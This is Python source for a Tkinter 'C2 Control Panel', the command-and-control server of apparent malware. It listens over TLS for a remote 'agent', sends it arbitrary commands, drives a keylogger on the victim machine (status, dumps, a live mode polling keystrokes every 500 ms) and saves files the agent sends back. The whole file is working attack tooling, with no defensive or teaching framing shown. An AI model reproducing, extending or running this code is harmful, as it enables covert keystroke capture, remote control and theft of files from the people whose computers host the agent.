import socket
import ssl
import tkinter as tk
from tkinter import scrolledtext
import threading
import struct
import queue
import select
import re

class ControlPanel:
    def __init__(self, root):
        self.root = root
        # --- State Management ---
        self.agent_keylogger_state = 'UNKNOWN' # UNKNOWN, STOPPED, RUNNING
        self.server_live_mode = False # True if live mode is active
        self.is_awaiting_dump_response = False # Request-Response Lock for live mode
        self.live_mode_timer_id = None

        self.log_queue = queue.Queue()
        self.command_queue = queue.Queue()

        # --- GUI Setup ---
        self.root.title("C2 Control Panel - Agent: Disconnected")
        self.log_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=100, height=35, bg="black", fg="lime green", font=("Consolas", 10))
        self.log_text.pack(pady=5, padx=5, expand=True, fill=tk.BOTH)
        # Configure tags for colored text
        self.log_text.tag_config('STS', foreground='cyan')
        self.log_text.tag_config('ERR', foreground='red')
        self.log_text.tag_config('CMD', foreground='yellow')
        self.log_text.tag_config('INFO', foreground='white')

        self.command_entry = tk.Entry(root, width=80, bg="#1c1c1c", fg="white", insertbackground="white", font=("Consolas", 10))
        self.command_entry.pack(pady=5, padx=5, fill=tk.X)
        self.command_entry.bind("<Return>", self.queue_command_event)

        threading.Thread(target=self.network_worker, daemon=True).start()
        self.process_gui_queue()

    def update_title(self):
        live_status = "(Live Mode)" if self.server_live_mode else ""
        self.root.title(f"C2 Control Panel - Agent State: {self.agent_keylogger_state} {live_status}")

    def log_message(self, message, tag='INFO'):
        # The tag determines the color of the message in the GUI
        self.log_queue.put((message, tag))

    def process_gui_queue(self):
        # GUI Update Batching is implemented here
        try:
            while not self.log_queue.empty():
                message, tag = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, message + "\n", tag)
        finally:
            self.log_text.see(tk.END)
            self.update_title()
            self.root.after(100, self.process_gui_queue)

    # --- Live Mode Logic ---
    def start_live_mode(self):
        if self.server_live_mode:
            self.log_message("[!] Server is already in Live Mode.", 'ERR')
            return
        if self.agent_keylogger_state != 'RUNNING':
            self.log_message("[!] Cannot start Live Mode: Agent keylogger is not RUNNING.", 'ERR')
            return

        self.log_message("[*] Entering Live Mode. Auto-dumping every 500ms.", 'STS')
        self.server_live_mode = True
        self.is_awaiting_dump_response = False # Reset lock
        self.live_mode_pulse()

    def stop_live_mode(self):
        if not self.server_live_mode:
            self.log_message("[!] Server is not in Live Mode.", 'ERR')
            return

        self.log_message("[*] Exiting Live Mode. Returning to Buffered Mode.", 'STS')
        self.server_live_mode = False
        # The timer will stop itself on the next pulse check

    def live_mode_pulse(self):
        if not self.server_live_mode:
            return # Exit the timer loop

        if not self.is_awaiting_dump_response:
            self.is_awaiting_dump_response = True # Engage lock
            self.command_queue.put('dump_keys')

        # Schedule the next pulse
        self.root.after(500, self.live_mode_pulse)

    def queue_command_event(self, event=None):
        command = self.command_entry.get().strip()
        if not command: return
        self.command_entry.delete(0, tk.END)

        # --- Intercept Server-Side Commands ---
        if command.lower() == 'keylog_live_on':
            self.start_live_mode()
        elif command.lower() == 'keylog_live_off':
            self.stop_live_mode()
        else:
            # Send all other commands to the agent
            self.log_message(f"[>] Sending: {command}", 'CMD')
            self.command_queue.put(command)

    def process_agent_message(self, message):
        # This function parses the state from the agent's response
        match = re.match(r"\[(STOPPED|RUNNING|UNKNOWN)\]\s*(.*)", message, re.DOTALL)
        if match:
            state, content = match.groups()
            if self.agent_keylogger_state != state:
                self.log_message(f"[*] Agent keylogger state changed to: {state}", 'STS')
                self.agent_keylogger_state = state
                if state != 'RUNNING' and self.server_live_mode:
                    self.log_message("[!] Agent state is no longer RUNNING. Forcing Live Mode off.", 'ERR')
                    self.stop_live_mode()
            return content
        return message

    def network_worker(self):
        host, port, client_socket = '0.0.0.0', 6666, None
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        try:
            context.load_cert_chain(certfile="server.crt", keyfile="server.key")
        except FileNotFoundError:
            self.log_message("[!] FATAL: server.crt or server.key not found.", 'ERR')
            return

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen(1)
        self.log_message(f"[*] Server listening securely on {host}:{port}")

        while True:
            try:
                if client_socket is None:
                    self.log_message("[*] Waiting for an agent to connect...")
                    conn, addr = server_socket.accept()
                    client_socket = context.wrap_socket(conn, server_side=True)
                    self.log_message(f"\n[+] Agent connected from: {addr[0]}:{addr[1]}\n")
                    self.agent_keylogger_state = 'UNKNOWN' # Reset state on new connection
                    self.command_queue.put('keylog_status') # Automatically query state on connect

                readable, _, _ = select.select([client_socket], [], [], 0.1)

                if readable:
                    # FIX APPLIED HERE: Removed MSG_PEEK for SSL compatibility.
                    header_bytes = client_socket.recv(5)
                    if not header_bytes:
                        raise ConnectionError("Client disconnected")

                    header = header_bytes.decode('utf-8')

                    len_data = client_socket.recv(4)
                    msg_len = struct.unpack('>I', len_data)[0]

                    if header == '[FIL]':
                        filename = client_socket.recv(msg_len).decode('utf-8')
                        file_size_data = client_socket.recv(8)
                        file_size = struct.unpack('>Q', file_size_data)[0]
                        self.log_message(f"[*] Receiving file '{filename}' ({file_size} bytes)...", 'STS')
                        file_data = b''
                        while len(file_data) < file_size:
                            chunk = client_socket.recv(4096)
                            if not chunk: raise ConnectionError("Client disconnected during file transfer")
                            file_data += chunk
                        with open(filename, 'wb') as f: f.write(file_data)
                        self.log_message(f"[+] File saved as '{filename}'")
                    else:
                        response = client_socket.recv(msg_len).decode('utf-8', 'ignore')
                        content = self.process_agent_message(response)

                        if "Keylog Dump" in content or "buffer was empty" in content:
                            self.is_awaiting_dump_response = False

                        if header == '[RSP]': self.log_message(f"[<] Response:\n{content}")
                        elif header == '[STS]': self.log_message(f"[<] Status: {content}", 'STS')
                        elif header == '[ERR]': self.log_message(f"[<] ERROR: {content}", 'ERR')

                if not self.command_queue.empty():
                    command = self.command_queue.get_nowait()
                    client_socket.sendall(command.encode('utf-8'))
                    self.command_queue.task_done()

            except (ConnectionError, ConnectionResetError, ssl.SSLError, EOFError, struct.error):
                self.log_message("\n[-] Agent disconnected.", 'ERR')
                if client_socket: client_socket.close()
                client_socket = None
                self.agent_keylogger_state = 'DISCONNECTED'
                if self.server_live_mode: self.stop_live_mode()
            except Exception as e:
                self.log_message(f"[!] Network worker error: {type(e).__name__}: {e}", 'ERR')
                if client_socket: client_socket.close()
                client_socket = None

if __name__ == "__main__":
    root = tk.Tk()
    app = ControlPanel(root)
    root.mainloop()
